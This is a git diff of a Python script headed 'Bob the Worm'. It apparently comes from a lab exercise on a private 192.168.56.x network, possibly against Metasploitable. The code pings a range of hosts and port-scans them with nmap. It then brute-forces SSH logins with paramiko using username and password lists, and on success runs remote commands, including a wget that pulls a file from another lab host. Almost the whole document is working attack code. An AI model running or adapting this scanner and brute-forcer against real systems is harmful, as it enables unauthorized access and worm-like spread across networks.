@@ -1,11 +1,14 @@
+#############################
+# Filename: hello.py        #
+# Bob the Worm              #
+# Date created: 10/26/2021  #
+#############################
+
 import os
-import sys
-import threading
 import nmap
-import subprocess
 import paramiko
-import main
-#import netifaces
+import time
+import netifaces
 
 
 IpList = []
@@ -21,7 +24,6 @@ def nmaper():
     print("\n----Scanning active machines for open ports----\n")
     portscan = nmap.PortScanner()
     scannedports = [20,21,22,23,25,53,67,68,69,80,110,443,1337,3389,13337]
-    #portnum = 22
     for target in IpList:
         print(f'Scanning: {target} for open ports:')
         #no output means no open ports
@@ -32,9 +34,9 @@ def nmaper():
                 print(f'Port {portnum} is {results}.')
                 if (portnum == 22):
                     SSHlist.append(target)
-
         print("-----------------------------------\n")
-    #once all open ports have been found
+        
+
         
 def open_file():
     with open('usernames.txt') as usernamefile:
@@ -51,7 +53,6 @@ def bruteforce():
     open_file()
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    #while (flag == False):
     for target in (SSHlist):
         print(f'\nBruteforcing SSH on {target} port 22\n')
         for user in usernames:
@@ -62,14 +63,13 @@ def bruteforce():
                     client.connect(target, username=user, password=passwd)
                     if client.get_transport() is not None:
                         if client.get_transport().is_active():
-                            print(f'Username: {user} and Password: {passwd} were successful!')
+                            print(f'\n((( Username: {user} and Password: {passwd} were successful! )))')
+                            time.sleep(5)
                             ssher(client)
                 except paramiko.ssh_exception.AuthenticationException:
                     print("Username or Password is incorrect.")
-                    #flag = False
                 except paramiko.ssh_exception.SSHException:
-                    #flag = False
-                    print('something is not working right')
+                    print('SSH server is not responding.')
 
 
 
@@ -80,23 +80,12 @@ def ssher(client):
     command2 = "wget http://192.168.56.101/yOu_HaVe_BeEn_HaCkEd"
     command3 = "cat yOu_HaVe_BeEn_HaCkEd"
 
-    #client = paramiko.SSHClient()
-    #client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    #for target in (SSHlist):
-        #for user in usernames:
-            #try:
-    #client.connect(target, username=user, password='msfadmin')
- #               return True
- #           except paramiko.ssh_exception.AuthenticationException:
-#                return False
     print(f'\n$ {command}')
     (stdin, stdout, stderr) = client.exec_command(command)
     lines = stdout.readlines()
     print(lines[0])
     print(f'\n$ {command2}')
     (stdin, stdout, stderr) = client.exec_command(command2)
-    #lines = stdout.readlines()
-    #print(lines)
     print(f'\n$ {command3}')
     (stdin, stdout, stderr) = client.exec_command(command3)
     lines = stdout.readlines()
@@ -109,6 +98,9 @@ def ssher(client):
 
 
 def ping():
+    #gw = netifaces.gateways()
+    #gatewy = gw['Host-Only'][netifaces.AF_INET][0]
+    #print(gatewy)
     print("\n----Scanning for active machines----")
     ipbase = "192.168.56."
     for x in range (100,110):
